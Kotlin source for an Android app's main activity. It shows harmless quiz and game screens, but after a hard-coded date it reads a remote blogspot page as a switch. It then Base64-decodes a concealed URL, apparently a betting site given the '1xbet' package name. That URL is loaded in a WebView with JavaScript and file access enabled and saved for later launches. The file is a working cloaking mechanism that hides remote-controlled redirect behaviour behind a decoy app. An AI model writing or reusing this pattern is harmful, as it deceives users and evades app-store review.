package app1.win.app1.win.sport1.win1.win.india1.xbet.win

import android.content.Context
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.os.*
import android.util.Base64
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.*
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import app1.win.app1.win.sport1.win1.win.india1.xbet.win.databinding.ActivityMainBinding
import okhttp3.*
import java.io.IOException
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*
import kotlin.concurrent.thread


lateinit var _binding: ActivityMainBinding
var summary = 0
private val wbClient = OkHttpClient()
private lateinit var shPref: SharedPreferences
private lateinit var editor1W: SharedPreferences.Editor
private val set: String = "settings"

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        _binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(_binding.root)

        val dateFormat = Date(122, 11,17)
        val date1 = Date()
        val dates2: DateFormat = SimpleDateFormat("yyyy.MM.dd", Locale.getDefault())
        val dates3: String = dates2.format(date1)
        val dates4: String = dates2.format(dateFormat)
//        val dateText1 = mydateFormat.format(setDate)
        val dates5 = dates2.parse(dates4)
        val dates6 = dates2.parse(dates3)
        if(dates6 >= dates5)
        {


            mainInitialisation()
            Log.d("keyShared", shPref.getString("Nfibet3Link", "пусто")!!)
            Log.d("keyShared", shPref.getInt("Nfibet3Number", 111).toString())

            // Если первый запуск, делаем запрос
            if (RunNumOne()) {
                Log.d("keys", RunNumOne().toString())
                UrlGets("https://abrahamlane.blogspot.com/2022/11/blog-post.html")
            }else{
                openWebsViews()
            }
        }
        else
        {
//
            _binding.lo.visibility = View.GONE
            _binding.pgBars.visibility = View.GONE
            _binding.m1.visibility = View.VISIBLE

        }




        _binding.b1.setOnClickListener {
            supportFragmentManager
                .beginTransaction()
                .replace(R.id.c_f, otveti1.newInstance())
                .commit()
            _binding.cF.visibility = View.VISIBLE
            _binding.b1.visibility = View.GONE
            _binding.baaaaton2.visibility = View.GONE
            _binding.t.visibility = View.GONE

        }
        _binding.baaaaton2.setOnClickListener {
            supportFragmentManager
                .beginTransaction()
                .replace(R.id.cont_2, gm1WinsAllMain.newInstance())
                .commit()
            _binding.cont2.visibility = View.VISIBLE
            _binding.b1.visibility = View.GONE
            _binding.baaaaton2.visibility = View.GONE
            _binding.t.visibility = View.GONE
        }
    }

    private fun UrlGets(Nfibet3urlLink: String) {

        val link1 = Request.Builder()
            .url(Nfibet3urlLink)
            .build()
        wbClient.newCall(link1).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    object : CountDownTimer(3000, 1000) {
                        override fun onTick(millisUntilFinished: Long) {

                        }

                        override fun onFinish() {
                            _binding.lo.visibility = View.GONE
                            _binding.pgBars.visibility = View.GONE
                            _binding.m1.visibility = View.VISIBLE
                        }
                    }.start()
                }
            }
            @RequiresApi(Build.VERSION_CODES.O)
            override fun onResponse(call: Call, response: Response) {
                val oneBody = response.body?.string()
                val Num1 = oneBody?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(0)
                    ?.replace(" ", "")
                    ?.replace(" ", "")
                    ?.trim()

                val urlGet1 =  oneBody?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(1)
                    ?.replace(" ", "")
                    ?.filterNot { it.isWhitespace() }

                val urlGet2 =  oneBody?.split("property='og:title'")
                    ?.get(1)
                    ?.split("'")
                    ?.get(1)
                    ?.split(",")
                    ?.get(2)
                    ?.replace(" ", "")
                    ?.filterNot { it.isWhitespace() }

                Log.d("key2", urlGet2.toString())

                Log.d("keyNumResponse", Num1.toString())
                thread {
                    Thread.sleep(5000)
                    Handler(Looper.getMainLooper()).post(Runnable {

                        Log.d("key", "работает")
                        val getInfo: Int = Num1!!.toInt()
                        val codeLinkGetErrors = response.code
                        when {
                            getInfo.toString().length > 1 -> {
                                Log.d("keyIf1", getInfo.toString())
//                                startActivity(
//                                    Intent(
//                                        this@main_main_project,
//                                        menu_main_project::class.java
//                                    )
//                                )
//                                finish()
                                _binding.lo.visibility = View.GONE
                                _binding.pgBars.visibility = View.GONE
                                _binding.m1.visibility = View.VISIBLE
                                Log.d("keyOpenResponseNum1", "no")
                            }
                            getInfo == 0 -> {
//                                startActivity(
//                                    Intent(
//                                        this@main_main_project,
//                                        menu_main_project::class.java
//                                    )
//                                )
//                                finish()
                                _binding.lo.visibility = View.GONE
                                _binding.pgBars.visibility = View.GONE
                                _binding.m1.visibility = View.VISIBLE
                                Log.d("keyOpenResponseNum2", "no")

                            }
                            getInfo == 1 -> {
                                Log.d("keyOpenResponseNum3", "no")
                                // loadurl(url = urldecod)

                                val desLinks = Base64.decode(urlGet1, Base64.DEFAULT)
                                val dasLink1 = String(desLinks)
                                val daesilnk2 = Base64.decode(urlGet2, Base64.DEFAULT)
                                val desc3 = String(daesilnk2)
                                val descLink4 = StringBuilder(dasLink1).append(desc3).toString()
                                Log.d("keyLinkeds", descLink4)
                                val urlsEncoders = descLink4.toString()
                                var webViewsMainOpensLink = _binding.webview
                                webViewsMainOpensLink.loadUrl(urlsEncoders)
                                webViewsMainOpensLink.settings.domStorageEnabled = true
                                webViewsMainOpensLink.settings.javaScriptEnabled = true
                                webViewsMainOpensLink.settings.useWideViewPort = true
                                webViewsMainOpensLink.settings.loadWithOverviewMode = true
                                webViewsMainOpensLink.settings.allowFileAccess = true
                                webViewsMainOpensLink.settings.javaScriptCanOpenWindowsAutomatically = true
                                webViewsMainOpensLink.settings.setSupportMultipleWindows(false)
                                webViewsMainOpensLink.settings.displayZoomControls = false
                                webViewsMainOpensLink.settings.builtInZoomControls = true
                                webViewsMainOpensLink.settings.setSupportZoom(true)
                                webViewsMainOpensLink.settings.pluginState = WebSettings.PluginState.ON
                                webViewsMainOpensLink.settings.mixedContentMode = 0
                                webViewsMainOpensLink.settings.setAppCacheEnabled(true)
                                webViewsMainOpensLink.settings.allowContentAccess = true
                                webViewsMainOpensLink.webViewClient = object: WebViewClient(){
                                    override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {


                                    }
                                    override fun onPageFinished(view: WebView, url: String) {
                                        _binding.lo.visibility = View.GONE
                                        _binding.pgBars.visibility = View.GONE
                                        _binding.m1.visibility = View.GONE

                                        webViewsMainOpensLink.visibility = View.VISIBLE

                                    }
                                }

                                // Сохраняем результат запроса
                                saveLinksMains(numbers = Num1!!.toInt(), string = descLink4.toString())

                                if (oneBody.contains("К сожалению, страница, которую вы искали в этом блоге, не существует")){}
                                Log.d("URLMAIN","$descLink4" )
                                getUrlLinksTraficks("$descLink4")
                            }
                            codeLinkGetErrors == 404 -> {
                                _binding.lo.visibility = View.GONE
                                _binding.pgBars.visibility = View.GONE
                                _binding.m1.visibility = View.VISIBLE
                            }
                        }

                    })
                }


            }
        })


    }

    private fun getUrlLinksTraficks(urlNf: String) {

        val reqLinkPast = Request.Builder()
            .url(urlNf)
            .build()
        Log.d("URLSMAINACTIVITY", "$urlNf")

        wbClient.newCall(reqLinkPast).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {

            }

            override fun onResponse(call: Call, responselink: Response) {
                val OnwWLinks = responselink.code
                if (OnwWLinks == 404){
                    _binding.lo.visibility = View.GONE
                    _binding.pgBars.visibility = View.GONE
                    _binding.m1.visibility = View.VISIBLE
                }
                saveUrls(Nfibet3codeerror = OnwWLinks)
            }
        })
    }

    private fun saveUrls(Nfibet3codeerror: Int) {
        editor1W.putInt("code", Nfibet3codeerror)
        editor1W.apply()
    }

    private fun saveLinksMains(numbers: Int, string: String) {

        editor1W.putInt("Nfibet3Number", numbers)
        Log.d("keyNumShared", numbers.toString())
        editor1W.putString("Nfibet3Link", string)
        Log.d("keyStr", string)
        editor1W.putBoolean("firstrun", false)
        editor1W.apply()
    }

    fun RunNumOne(): Boolean {
        Log.d("keyOpen", "open")
        return (shPref.getBoolean("firstrun", true) ?: true)
    }


    private fun openWebsViews() {


        Handler(Looper.getMainLooper()).post(Runnable {
            val infoMain = shPref.getInt("Nfibet3Number", 111)
            val errorCodes = shPref.getInt("Nfibet3code", 404)
            if (infoMain.toString().length > 1) {
                _binding.lo.visibility = View.GONE
                _binding.pgBars.visibility = View.GONE
                _binding.m1.visibility = View.VISIBLE
                Log.d("keyOpenif2", infoMain.toString())
            } else if (infoMain == 0) {
                _binding.lo.visibility = View.GONE
                _binding.pgBars.visibility = View.GONE
                _binding.m1.visibility = View.VISIBLE
                Log.d("keyOpen2", "no")

            } else if (infoMain == 1) {
                Log.d("keyOpen3", "no")
                var websireOpen = _binding.webview
                val getUrls = shPref.getString("Nfibet3Link", "")
                websireOpen.loadUrl(getUrls!!)
                websireOpen.settings.domStorageEnabled = true
                websireOpen.settings.javaScriptEnabled = true
                websireOpen.settings.useWideViewPort = true
                websireOpen.settings.loadWithOverviewMode = true
                websireOpen.settings.allowFileAccess = true
                websireOpen.settings.javaScriptCanOpenWindowsAutomatically = true
                websireOpen.settings.setSupportMultipleWindows(false)
                websireOpen.settings.displayZoomControls = false
                websireOpen.settings.builtInZoomControls = true
                websireOpen.settings.setSupportZoom(true)
                websireOpen.settings.pluginState = WebSettings.PluginState.ON
                websireOpen.settings.mixedContentMode = 0
                websireOpen.settings.setAppCacheEnabled(true)
                websireOpen.settings.allowContentAccess = true
//if(sharedPreferences.getInt("code", Nfibet3codeLink) == 404){
//
//                            _binding.loading.visibility = View.GONE
//                            _binding.progressBar.visibility = View.GONE
//                            _binding.webview.visibility = View.GONE
//                            _binding.menu.visibility = View.VISIBLE
//}
//else{
                websireOpen.webViewClient = object: WebViewClient(){

                    override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
                        super.onPageStarted(view, url, favicon)
                    }
                    override fun onPageFinished(view: WebView, url: String) {

                        _binding.lo.visibility = View.GONE
                        _binding.pgBars.visibility = View.GONE
                        _binding.webview.visibility = View.VISIBLE

                    }

                    //}
                }



            } else if (errorCodes == 404) {
                _binding.lo.visibility = View.GONE
                _binding.pgBars.visibility = View.GONE
                _binding.m1.visibility = View.VISIBLE
                Log.d("keyFail", "словил 404")

            }
        })
    }
    private fun mainInitialisation() {
        shPref = this.getSharedPreferences(set, Context.MODE_PRIVATE)
        editor1W = shPref.edit()
    }
    override fun onKeyDown(keyCodeNfibet3: Int, eventNfibet3: KeyEvent?): Boolean {
        if ((keyCodeNfibet3 == KeyEvent.KEYCODE_BACK) && _binding.webview.canGoBack()) {
            _binding.webview.goBack()
            return true
        }

        return super.onKeyDown(keyCodeNfibet3, eventNfibet3)
    }
    override fun onBackPressed() {
        super.onBackPressed()
        if ( _binding.webview.isFocused() &&  _binding.webview.canGoBack()) {
            _binding.webview.goBack()
        } else {
            super.onBackPressed()
        }
    }

}